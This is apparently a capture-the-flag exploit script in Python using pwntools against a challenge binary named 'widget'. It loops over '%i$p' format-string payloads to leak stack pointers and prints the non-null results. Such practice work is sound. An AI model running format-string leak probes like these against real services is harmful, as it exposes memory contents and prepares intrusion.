#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
#io = remote('challs.actf.co', 31320)
exe = './widget'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'


# =========================================================
#                         EXPLOITS
# =========================================================

for i in range(1, 30):
    try:
        # run process
        io = process(exe)
        # Format the payload to location on stack
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char etc)
        io.sendlineafter(b'Amount: ', b'20')
        io.sendlineafter(b'Contents: ', '%{}$p'.format(i).encode())
        io.recvuntil(b'Your input: ')
        # receive result
        result = io.recv()
        #print in not null
        if not b'(nil)' in result:
            print(result)
        # close process
        io.close()
    except EOFError:
        io.close()
